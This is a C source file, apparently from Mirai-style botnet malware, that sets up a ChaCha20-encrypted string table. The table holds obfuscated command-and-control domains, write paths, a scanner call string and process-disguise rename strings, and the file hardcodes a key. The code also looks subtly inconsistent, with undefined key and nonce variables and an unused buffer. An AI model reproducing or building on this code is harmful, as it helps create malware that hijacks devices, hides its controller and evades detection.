
#define _GNU_SOURCE

#include "headers/chacha20.h"
#include "headers/table.h"
#include <string.h>
#include "headers/util.h"

char *table_key = "\x73\x6F\x6D\x65\x6F\x66\x66\x64\x65\x65\x7A\x6E\x75\x74\x73";
int length = 16;

Encryption *enc = NULL;

static void xor_add(EncryptionTable etable, const char *string, int len)
{
    Encryption *crypt = &enc[(int)etable];

    crypt->string = strdup((char *)string);
    crypt->len = len;

    char decrypt[crypt->len + 1];
    
    chacha20_xor(key, 1, nonce, crypt->string, crypt->string, crypt->len);
    crypt->string[crypt->len] = '\0';

    

#ifdef DEBUG
    printf("added \"%s\" to structure on index: \"%d\"\n", crypt->string, (int)etable);
#endif
}

void xor_init(void)
{
    enc = calloc(ENC_TABLE_MAX, sizeof(Encryption));

    xor_add(TABLE_EXEC_SUCCESS, "\x34\xA6\xC3\x07\xD1\x5F\x9E\xCC\x67\x88\xAB\xA5\x7E\x37\x3A\xE8\xCC\xD8\xCA", 19); 
    xor_add(TABLE_WRITEPATH, "\x73\xB3\xC7\x1B", 4); 
    xor_add(TABLE_WRITEPATH1, "\x73\xB1\xCB\x19\xDE\x48\x9B\xD5", 8); 
    xor_add(TABLE_WRITEPATH2, "\x73\xB1\xCB\x19\xDE\x4E\x83\xCB", 8); 
    xor_add(TABLE_WRITEPATH3, "\x73\xA3\xCF\x1D\xDE\x4F\x9E\xC8", 8); 
    xor_add(TABLE_WRITEPATH4, "\x73\xAA\xC4\x1F", 4); 
    xor_add(TABLE_WRITEPATH5, "\x73\xAF\xC5\x06\x94", 5); 
    xor_add(TABLE_CNCDOMAIN, "\x3F\xA6\xD9\x0A\x93\x50\x97\xCB\x6A\x88\xA5\xAC\x66\x30", 14);
    xor_add(TABLE_CNCDOMAIN1, "\x2F\xB3\xCB\x19\x82\x54\x9F\xD5\x27\x8E\xE4\xB8\x77\x3B\x26", 15);
    xor_add(TABLE_CNCDOMAIN2, "\x2F\xA2\xCB\x07\xDF\x53\x85\xD6", 8);
    xor_add(TABLE_CNCDOMAIN3, "\x34\xA8\xDE\x0E\x9D\x4E\x81\xC4\x67\x8D\xEA\xE6\x6F\x37\x26\xE5\xD9\xD3", 18);
    xor_add(TABLE_SCANCALL, "\x65\xF6\x84\x52\xC3\x12\xC4\x91\x39\xC7\xBE\xF0", 12);
    xor_add(TABLE_RENAME1, "\x31\xAE\xC4\x02\xAE\x54\x82\xD1\x79\x8D", 10);
    xor_add(TABLE_RENAME2, "\x07\xB0\xCB\x1F\x92\x54\x92\xCA\x6E\xC6\xBB\x95", 12);
    xor_add(TABLE_RENAME3, "\x73\xA5\xC3\x05\xDE\x5E\x83\xD6\x70\x8B\xE4\xB0\x3F\x2A\x31\xE8\xC8\xD8\xDA\x49", 20);
    xor_add(TABLE_RENAME4, "\x07\xAC\xD9\x1C\x90\x4C\x92\x95\x54", 9);
    xor_add(TABLE_RENAME5, "\x73\xA5\xC3\x05\xDE\x5E\x83\xD6\x70\x8B\xE4\xB0\x3F\x30\x20\xF4\xC9", 17);
    xor_add(TABLE_RENAME6, "\x73\xA5\xC3\x05\xDE\x4F\x9E\x85\x26\x8C\xFF\xAB\x30\x37\x3A\xED\xD9\x98\xCA\x02\xD3\x30\xC6", 23);

}
